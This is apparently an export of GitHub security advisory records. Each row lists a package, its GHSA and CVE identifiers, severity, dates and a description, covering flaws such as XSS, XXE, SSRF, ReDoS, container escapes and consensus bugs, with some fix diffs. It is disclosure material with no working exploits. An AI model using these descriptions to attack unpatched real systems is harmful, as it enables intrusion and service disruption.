2015,20276,Plone,GHSA-35rg-466w-77h3,CVE-2021-33507,https://github.com/advisories/GHSA-35rg-466w-77h3,moderate,2021-06-18 18:44:50 UTC,"Cross-site scripting in Products.CMFCore, Products.PluggableAuthService, Plone","Zope Products.CMFCore before 2.5.1 and Products.PluggableAuthService before 2.6.2, as used in Plone through 5.2.4 and other products, allow Reflected XSS.",pip
2016,30392,Products.PluggableAuthService,GHSA-35rg-466w-77h3,CVE-2021-33507,https://github.com/advisories/GHSA-35rg-466w-77h3,moderate,2021-06-18 18:44:50 UTC,"Cross-site scripting in Products.CMFCore, Products.PluggableAuthService, Plone","Zope Products.CMFCore before 2.5.1 and Products.PluggableAuthService before 2.6.2, as used in Plone through 5.2.4 and other products, allow Reflected XSS.",pip
2017,23298,tendermint,GHSA-6jqj-f58p-mrw3,CVE-2020-15091,https://github.com/advisories/GHSA-6jqj-f58p-mrw3,moderate,2021-12-20 18:17:33 UTC,Denial of Service in TenderMint,"### Description

**Denial of Service**

Tendermint 0.33.0 and above allow block proposers to include signatures for the wrong block. This may happen naturally if you start a network, have it run for some time and restart it without changing the chainID. (It is a [misconfiguration](https://docs.tendermint.com/master/tendermint-core/using-tendermint.html) to reuse chainIDs.) Correct block proposers will accidentally include signatures for the wrong block if they see these signatures, and then commits won't validate, making all proposed blocks invalid. A malicious validator (even with a minimal amount of stake) can use this vulnerability to completely halt the network.

Tendermint 0.33.6 checks all the signatures are for the block with +2/3 majority before creating a commit.

**False Witness**

Tendermint 0.33.1 and above are no longer fully verifying commit signatures during block execution - they stop after +2/3. This means proposers can propose blocks that contain valid +2/3 signatures and then the rest of the signatures can be whatever they want. They can claim that all the other validators signed just by including a CommitSig with arbitrary signature data. While this doesn't seem to impact safety of Tendermint per se, it means that Commits may contain a lot of invalid data **.

_** This was already true of blocks, since they could include invalid txs filled with garbage, but in that case the application knew that they are invalid and could punish the proposer. But since applications didn't--and don't-- verify commit signatures directly (they trust Tendermint to do that), they won't be able to detect it._

This can impact incentivization logic in the application that depends on the LastCommitInfo sent in BeginBlock, which includes which validators signed. For instance, Gaia incentivizes proposers with a bonus for including more than +2/3 of the signatures. But a proposer can now claim that bonus just by including arbitrary data for the final -1/3 of validators without actually waiting for their signatures. There may be other tricks that can be played because of this.

Tendermint 0.33.6 verifies all the signatures during block execution ***.

_*** Please note that the light client does not check nil votes and exits as soon as 2/3+ of the signatures are checked._

### Impact

- All nodes
- The network stops due to having a commit with a wrong signature.

### Patches

- v0.33.6

### Workarounds

No workarounds.

### References

- https://github.com/tendermint/tendermint/issues/4926

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [tendermint/tendermint](https://github.com/tendermint/tendermint)
* Email us at [security@tendermint.com](mailto:security@tendermint.com)

More information can be found [here](https://tendermint.com/security/).",go
2018,22385,runc,GHSA-g54h-m393-cpwq,,https://github.com/advisories/GHSA-g54h-m393-cpwq,low,2021-12-20 18:21:54 UTC,devices resource list treated as a blacklist by default,"### Impact
Contrary to the [OCI runtime specification](https://github.com/opencontainers/runtime-spec/blob/v1.0.2/config-linux.md#device-whitelist), `runc`'s implementation of the `linux.resources.devices` list was a black-list by default. This means that users who created their own `config.json` objects and didn't prefix a deny-all rule (`{""allow"": false, ""permissions"": ""rwm""}` or equivalent) were not provided protection by the `devices` cgroup. This would allow malicious containers (with sufficient privileges) to create arbitrary device inodes (assuming they have `CAP_MKNOD`) and operate on any device inodes they may have access to (assuming they have regular Unix DAC permissions).

However, most (if not all) programs that make use of `runc` include this deny-all rule. This was most likely added before the specification mandated a white-list of devices, and the fact that all programs wrote their own deny-all rule obscured the existence of this bug for several years. In fact, even the specification's examples include a default deny-all rule! We therefore believe that while this is a security bug (and has been fixed as such), it was almost certainly not exploitable in the wild due to the inclusion of default deny-all rules by all known users of `runc` -- hence why this advisory has low severity.

### Patches
This issue has been fixed in [a patch that was part of a larger rework of the devices cgroup code in runc](https://github.com/opencontainers/runc/pull/2391) -- which lead to the discovery of this security bug. Users should upgrade to 1.0.0-rc91 as soon as it is released, or wait for your distribution to backport the relevant fixes.

### Workarounds
If you are using `runc` directly, ensure that there is a deny-all entry at the beginning of `linux.resources.devices` -- such an entry would look like `{""allow"": false, ""permissions"": ""rwm""}` (all other fields are ignored, though `type` must be set to `""a""` or `null` if it is present).

Users which consume `runc` through another program should check whether their containers are operating under a white-list -- this can be done by reading `/sys/fs/cgroup/devices/devices.list` inside the container. If the file contains only the entry `a *:* rwm` (meaning the cgroup is in black-list mode, which likely means ""allow all device access"") then your containers are vulnerable to this issue.

As always, we recommend **in the strongest possible terms** that all of our users enable user namespaces on all of their workloads (or pressure their vendors to do so). User namespaces are one of the most significant defense-in-depth protections you can enable for containers, and have prevented many container-related vulnerabilities (both kernel 0days as well as bugs in container runtimes, such as this one).

### References
* https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v1/devices.html
* [opencontainers/runtime-spec/config-linux.md#device-whitelist](https://github.com/opencontainers/runtime-spec/blob/v1.0.2/config-linux.md#device-whitelist)
* https://github.com/opencontainers/runc/pull/2391

### For more information
If you have any questions or comments about this advisory:
* [Open an issue in this repo](https://github.com/opencontainers/runc/issues/new).
* Email us at <security@opencontainers.org>.",go
2019,32830,go-ethereum/core,GHSA-xw37-57qp-9mm4,CVE-2020-26265,https://github.com/advisories/GHSA-xw37-57qp-9mm4,moderate,2021-06-29 21:14:16 UTC,Consensus flaw during block processing in github.com/ethereum/go-ethereum,"### Impact

A consensus-vulnerability in Geth could cause a chain split, where vulnerable versions refuse to accept the canonical chain. 

### Description


A flaw was repoted at 2020-08-11 by John Youngseok Yang (Software Platform Lab), where a particular sequence of transactions could cause a consensus failure.

- Tx 1:
  - `sender` invokes `caller`.
  - `caller` invokes `0xaa`. `0xaa` has 3 wei, does a self-destruct-to-self
  - `caller` does a  `1 wei` -call to `0xaa`, who thereby has 1 wei (the code in `0xaa` still executed, since the tx is still ongoing, but doesn't redo the selfdestruct, it takes a different path if callvalue is non-zero)

- Tx 2:
  - `sender` does a 5-wei call to 0xaa. No exec (since no code). 

In geth, the result would be that `0xaa` had `6 wei`, whereas OE reported (correctly) `5` wei. Furthermore, in geth, if the second tx was not executed, the `0xaa` would be destructed, resulting in `0 wei`. Thus obviously wrong. 

It was determined that the root cause was this [commit](https://github.com/ethereum/go-ethereum/commit/223b950944f494a5b4e0957fd9f92c48b09037ad) from [this PR](https://github.com/ethereum/go-ethereum/pull/19953). The semantics of `createObject` was subtly changd, into returning a non-nil object (with `deleted=true`) where it previously did not if the account had been destructed. This return value caused the new object to inherit the old `balance`:

```golang
func (s *StateDB) CreateAccount(addr common.Address) {
	newObj, prev := s.createObject(addr)
	if prev != nil {
		newObj.setBalance(prev.data.Balance)
	}
}
```

It was determined that the minimal possible correct fix was

```diff
+++ b/core/state/statedb.go
@@ -589,7 +589,10 @@ func (s *StateDB) createObject(addr common.Address) (newobj, prev *stateObject)
                s.journal.append(resetObjectChange{prev: prev, prevdestruct: prevdestruct})
        }
        s.setStateObject(newobj)
-       return newobj, prev
+       if prev != nil && !prev.deleted {
+               return newobj, prev
+       }
+       return newobj, nil
```

### Patches

See above. The fix was included in Geth `v1.9.20` ""Paragade"".

### Credits

The bug was found by @johnyangk and reported via bounty@ethereum.org.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)
* Email us at [security@ethereum.org](mailto:security@ethereum.org)",go
2020,16012,postcss,GHSA-566m-qj78-rww5,CVE-2021-23382,https://github.com/advisories/GHSA-566m-qj78-rww5,moderate,2022-01-07 00:21:36 UTC,Regular Expression Denial of Service in postcss,The package postcss versions before 7.0.36 or between 8.0.0 and 8.2.13 are vulnerable to Regular Expression Denial of Service (ReDoS) via getAnnotationURL() and loadAnnotation() in lib/previous-map.js. The vulnerable regexes are caused mainly by the sub-pattern \/\*\s* sourceMappingURL=(.*).,npm
2021,23298,tendermint,GHSA-f3w5-v9xx-rp8p,,https://github.com/advisories/GHSA-f3w5-v9xx-rp8p,moderate,2021-12-20 18:17:41 UTC,Signature verification failure in Tendermint,"_The root cause of this security vulnerability is in the Tendermint specification, and this advisory is a duplicate of https://github.com/tendermint/spec/security/advisories/GHSA-jqfc-687g-59pw._


### Impact
Tendermint light clients running versions 0.34.0 to 0.34.8 are unable to detect and punish a new kind of attack. We’re calling this a “forward lunatic attack,” or FLA. The severity of this vulnerability is _moderate_. 

Note that an FLA cannot be successfully executed unless there are already ⅓+ Byzantine validators, and therefore outside of Tendermint’s security model; however, it is important to be able to detect and punish these kinds of attacks in order to incentivize correct behavior.

In an FLA, an attacking validator (with ⅓+ voting power) signs commit messages for arbitrary application state associated with a block height that hasn’t been seen yet, hence the name “forward lunatic attacks.” A malicious validator effectively executes a [lunatic attack](https://docs.tendermint.com/master/spec/light-client/accountability/#the-misbehavior-of-faulty-validators), but signs messages for a target block that is higher than the current block. This can be dangerous: Typically, misbehavior evidence is only created when there are conflicting blocks at the same height, but by targeting a block height that is far “ahead” of the current chain height, it’s possible that the chain will not produce a (conflicting) block at the target height in time to create evidence. 

Prior to Tendermint v0.34.9, the light client could accept a bad header from its primary witness, and would not be able to form evidence of this deception, even if all the secondary witnesses were correct. Because the light client is responsible for verifying cross-chain state for IBC, a successful FLA could result in loss of funds. However, it is important to note that FLAs are only possible outside the Tendermint security model. 

All FLAs, attempted and successful, leave traces of provable misbehavior on-chain. A faulty header contains signatures from the faulty validator, and even in unpatched versions of Tendermint Core, networks could use social consensus (off-chain action) to recover the network. The patches introduced in Tendermint Core v0.34.9 handle all evidence automatically and on-chain. 

Note that this fix also allows for successful automatic reporting of FLAs, even after a chain halt. By adding a time to FetchBlock, light clients effectively have a backup way to determine if a halted chain should have continued, and it will be able to submit evidence as soon as the chain resumes. 

### Patches
This problem has been patched in Tendermint Core v0.34.9. 

### Workarounds
There are no workarounds. All users are recommended to upgrade to Tendermint Core v0.34.9 at their earliest possible convenience. 

### Credits

Thank you to @MaximilianDiez for originally surfacing this issue, and to @cmwaters, @josef-widder, and @milosevic for creating fixes at both the implementation and specification level.

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [tendermint/tendermint](https://github.com/tendermint/tendermint)
* Email us at [security@tendermint.com](mailto:security@tendermint.com)",go
2022,22385,runc,GHSA-q3j5-32m5-58c2,CVE-2016-3697,https://github.com/advisories/GHSA-q3j5-32m5-58c2,high,2021-12-20 18:21:34 UTC,Privilege Elevation in runc,"libcontainer/user/user.go in runC before 0.1.0, as used in Docker before 1.11.2, improperly treats a numeric UID as a potential username, which allows local users to gain privileges via a numeric username in the password file in a container.",go
2023,22385,runc,GHSA-gp4j-w3vj-7299,CVE-2016-9962,https://github.com/advisories/GHSA-gp4j-w3vj-7299,moderate,2021-12-20 18:21:43 UTC,Information Exposure in RunC,"RunC allowed additional container processes via 'runc exec' to be ptraced by the pid 1 of the container.  This allows the main processes of the container, if running as root, to gain access to file-descriptors of these new processes during the initialization and can lead to container escapes or modification of runC state before the process is fully placed inside the container.",go
2024,23654,origin,GHSA-rf3m-mhv7-x39f,CVE-2015-5250,https://github.com/advisories/GHSA-rf3m-mhv7-x39f,moderate,2021-12-20 16:58:22 UTC,Denial of Service in OpenShift Origin,The API server in OpenShift Origin 1.0.5 allows remote attackers to cause a denial of service (master process crash) via crafted JSON data.,go
2025,23654,origin,GHSA-m3fm-h5jp-q79p,CVE-2016-1906,https://github.com/advisories/GHSA-m3fm-h5jp-q79p,critical,2021-12-20 16:58:14 UTC,Authorization bypass in Openshift,Openshift allows remote attackers to gain privileges by updating a build configuration that was created with an allowed type to a type that is not allowed.,go
2026,13507,System.Net.Http.WinHttpHandler,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2027,22048,yaml.v2,GHSA-wxc4-f4m6-wwqv,CVE-2019-11254,https://github.com/advisories/GHSA-wxc4-f4m6-wwqv,moderate,2021-12-20 16:55:06 UTC,Excessive Platform Resource Consumption within a Loop in Kubernetes,"The Kubernetes API Server component in versions 1.1-1.14, and versions prior to 1.15.10, 1.16.7 and 1.17.3 allows an authorized user who sends malicious YAML payloads to cause the kube-apiserver to consume excessive CPU cycles while parsing YAML.",go
2028,34486,org.bouncycastle:bcprov-jdk16,GHSA-73xv-w5gp-frxh,CVE-2020-28052,https://github.com/advisories/GHSA-73xv-w5gp-frxh,high,2021-04-30 16:14:15 UTC,Logic error in Legion of the Bouncy Castle BC Java,"An issue was discovered in Legion of the Bouncy Castle BC Java 1.65 and 1.66. The OpenBSDBCrypt.checkPassword utility method compared incorrect data when checking the password, allowing incorrect passwords to indicate they were matching with previously hashed ones that were different.",maven
2029,37675,org.bouncycastle:bcprov-jdk14,GHSA-73xv-w5gp-frxh,CVE-2020-28052,https://github.com/advisories/GHSA-73xv-w5gp-frxh,high,2021-04-30 16:14:15 UTC,Logic error in Legion of the Bouncy Castle BC Java,"An issue was discovered in Legion of the Bouncy Castle BC Java 1.65 and 1.66. The OpenBSDBCrypt.checkPassword utility method compared incorrect data when checking the password, allowing incorrect passwords to indicate they were matching with previously hashed ones that were different.",maven
2030,35517,org.bouncycastle:bcprov-ext-jdk15on,GHSA-73xv-w5gp-frxh,CVE-2020-28052,https://github.com/advisories/GHSA-73xv-w5gp-frxh,high,2021-04-30 16:14:15 UTC,Logic error in Legion of the Bouncy Castle BC Java,"An issue was discovered in Legion of the Bouncy Castle BC Java 1.65 and 1.66. The OpenBSDBCrypt.checkPassword utility method compared incorrect data when checking the password, allowing incorrect passwords to indicate they were matching with previously hashed ones that were different.",maven
2031,34021,org.bouncycastle:bcprov-jdk15on,GHSA-73xv-w5gp-frxh,CVE-2020-28052,https://github.com/advisories/GHSA-73xv-w5gp-frxh,high,2021-04-30 16:14:15 UTC,Logic error in Legion of the Bouncy Castle BC Java,"An issue was discovered in Legion of the Bouncy Castle BC Java 1.65 and 1.66. The OpenBSDBCrypt.checkPassword utility method compared incorrect data when checking the password, allowing incorrect passwords to indicate they were matching with previously hashed ones that were different.",maven
2032,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-h3cw-g4mq-c5x2,CVE-2020-24616,https://github.com/advisories/GHSA-h3cw-g4mq-c5x2,high,2021-12-09 19:14:51 UTC,Code Injection in jackson-databind,"This project contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. FasterXML jackson-databind 2.x before 2.9.10.6 mishandles the interaction between serialization gadgets and typing, related to br.com.anteros.dbcp.AnterosDBCPDataSource (aka Anteros-DBCP).",maven
2033,34486,org.bouncycastle:bcprov-jdk16,GHSA-72m5-fvvv-55m6,CVE-2020-26939,https://github.com/advisories/GHSA-72m5-fvvv-55m6,moderate,2021-04-22 16:16:49 UTC,Observable Differences in Behavior to Error Inputs in Bouncy Castle,"In Legion of the Bouncy Castle BC before 1.55 and BC-FJA before 1.0.2, attackers can obtain sensitive information about a private exponent because of Observable Differences in Behavior to Error Inputs. This occurs in org.bouncycastle.crypto.encodings.OAEPEncoding. Sending invalid ciphertext that decrypts to a short payload in the OAEP Decoder could result in the throwing of an early exception, potentially leaking some information about the private exponent of the RSA private key performing the encryption.",maven
2034,35085,org.bouncycastle:bcprov-jdk15,GHSA-72m5-fvvv-55m6,CVE-2020-26939,https://github.com/advisories/GHSA-72m5-fvvv-55m6,moderate,2021-04-22 16:16:49 UTC,Observable Differences in Behavior to Error Inputs in Bouncy Castle,"In Legion of the Bouncy Castle BC before 1.55 and BC-FJA before 1.0.2, attackers can obtain sensitive information about a private exponent because of Observable Differences in Behavior to Error Inputs. This occurs in org.bouncycastle.crypto.encodings.OAEPEncoding. Sending invalid ciphertext that decrypts to a short payload in the OAEP Decoder could result in the throwing of an early exception, potentially leaking some information about the private exponent of the RSA private key performing the encryption.",maven
2035,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-wh8g-3j2c-rqj5,CVE-2020-35490,https://github.com/advisories/GHSA-wh8g-3j2c-rqj5,high,2021-12-09 19:15:00 UTC,Serialization gadgets exploit in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.dbcp2.datasources.PerUserPoolDataSource.",maven
2036,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-r3gr-cxrf-hg25,CVE-2020-35491,https://github.com/advisories/GHSA-r3gr-cxrf-hg25,high,2021-12-09 19:15:11 UTC,Serialization gadgets exploit in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.dbcp2.datasources.SharedPoolDataSource.",maven
2037,30388,plone.supermodel,GHSA-wq6x-g685-w5f2,CVE-2020-28734,https://github.com/advisories/GHSA-wq6x-g685-w5f2,high,2021-04-07 21:13:00 UTC,Improper Restriction of XML External Entity Reference in Plone,Plone before 5.2.3 allows XXE attacks via a feature that is explicitly only available to the Manager role.,pip
2038,20672,plone.app.dexterity,GHSA-wq6x-g685-w5f2,CVE-2020-28734,https://github.com/advisories/GHSA-wq6x-g685-w5f2,high,2021-04-07 21:13:00 UTC,Improper Restriction of XML External Entity Reference in Plone,Plone before 5.2.3 allows XXE attacks via a feature that is explicitly only available to the Manager role.,pip
2039,29731,plone.app.theming,GHSA-wq6x-g685-w5f2,CVE-2020-28734,https://github.com/advisories/GHSA-wq6x-g685-w5f2,high,2021-04-07 21:13:00 UTC,Improper Restriction of XML External Entity Reference in Plone,Plone before 5.2.3 allows XXE attacks via a feature that is explicitly only available to the Manager role.,pip
2040,30388,plone.supermodel,GHSA-2c8c-84w2-j38j,CVE-2020-28736,https://github.com/advisories/GHSA-2c8c-84w2-j38j,high,2021-04-07 21:14:00 UTC,Improper Restriction of XML External Entity Reference in Plone,"Plone before 5.2.3 allows XXE attacks via a feature that is protected by an unapplied permission of plone.schemaeditor.ManageSchemata (therefore, only available to the Manager role).",pip
2041,20672,plone.app.dexterity,GHSA-2c8c-84w2-j38j,CVE-2020-28736,https://github.com/advisories/GHSA-2c8c-84w2-j38j,high,2021-04-07 21:14:00 UTC,Improper Restriction of XML External Entity Reference in Plone,"Plone before 5.2.3 allows XXE attacks via a feature that is protected by an unapplied permission of plone.schemaeditor.ManageSchemata (therefore, only available to the Manager role).",pip
2042,29731,plone.app.theming,GHSA-2c8c-84w2-j38j,CVE-2020-28736,https://github.com/advisories/GHSA-2c8c-84w2-j38j,high,2021-04-07 21:14:00 UTC,Improper Restriction of XML External Entity Reference in Plone,"Plone before 5.2.3 allows XXE attacks via a feature that is protected by an unapplied permission of plone.schemaeditor.ManageSchemata (therefore, only available to the Manager role).",pip
2043,30388,plone.supermodel,GHSA-x7wf-5mjc-6x76,CVE-2020-28735,https://github.com/advisories/GHSA-x7wf-5mjc-6x76,high,2021-04-07 21:13:44 UTC,SSRF attacks via tracebacks in Plone,Plone before 5.2.3 allows SSRF attacks via the tracebacks feature (only available to the Manager role).,pip
2044,20672,plone.app.dexterity,GHSA-x7wf-5mjc-6x76,CVE-2020-28735,https://github.com/advisories/GHSA-x7wf-5mjc-6x76,high,2021-04-07 21:13:44 UTC,SSRF attacks via tracebacks in Plone,Plone before 5.2.3 allows SSRF attacks via the tracebacks feature (only available to the Manager role).,pip
2045,29731,plone.app.theming,GHSA-x7wf-5mjc-6x76,CVE-2020-28735,https://github.com/advisories/GHSA-x7wf-5mjc-6x76,high,2021-04-07 21:13:44 UTC,SSRF attacks via tracebacks in Plone,Plone before 5.2.3 allows SSRF attacks via the tracebacks feature (only available to the Manager role).,pip
2046,16018,aws-sdk,GHSA-rrc9-gqf8-8rwg,CVE-2020-28472,https://github.com/advisories/GHSA-rrc9-gqf8-8rwg,high,2021-11-16 21:26:43 UTC,Prototype Pollution via file load in aws-sdk and @aws-sdk/shared-ini-file-loader,"This affects the package @aws-sdk/shared-ini-file-loader before 1.0.0-rc.9; the package aws-sdk before 2.814.0. If an attacker submits a malicious INI file to an application that parses it with loadSharedConfigFiles , they will pollute the prototype on the application. This can be exploited further depending on the context.",npm
2047,15483,Microsoft.AspNetCore.Mvc.WebApiCompatShim,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2048,13017,Microsoft.AspNetCore.Mvc.ViewFeatures,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2049,13281,Microsoft.AspNetCore.Mvc.TagHelpers,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2050,13192,Microsoft.AspNetCore.Mvc.Razor,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2051,14354,Microsoft.AspNetCore.Mvc.Localization,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2052,13991,Microsoft.AspNetCore.Mvc.Formatters.Xml,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2053,13221,Microsoft.AspNetCore.Mvc.Formatters.Json,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2054,13583,Microsoft.AspNetCore.Mvc.DataAnnotations,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2055,14457,Microsoft.AspNetCore.Mvc.Cors,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2056,13601,Microsoft.AspNetCore.Mvc.ApiExplorer,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2057,13092,Microsoft.AspNetCore.Mvc.Abstractions,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2058,13534,System.Net.WebSockets.Client,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2059,13095,System.Net.Security,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2060,13507,System.Net.Http.WinHttpHandler,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2061,13209,System.Text.Encodings.Web,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2062,12860,System.Net.Http,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2063,12903,Microsoft.AspNetCore.Mvc.Core,GHSA-j8f4-2w4p-mhjc,CVE-2017-0256,https://github.com/advisories/GHSA-j8f4-2w4p-mhjc,moderate,2018-10-16 19:57:48 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc,A spoofing vulnerability exists when the ASP.NET Core fails to properly sanitize web requests.,nuget
2064,15483,Microsoft.AspNetCore.Mvc.WebApiCompatShim,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2065,13017,Microsoft.AspNetCore.Mvc.ViewFeatures,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2066,13281,Microsoft.AspNetCore.Mvc.TagHelpers,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2067,13192,Microsoft.AspNetCore.Mvc.Razor,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2068,14354,Microsoft.AspNetCore.Mvc.Localization,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2069,13991,Microsoft.AspNetCore.Mvc.Formatters.Xml,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2070,13221,Microsoft.AspNetCore.Mvc.Formatters.Json,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
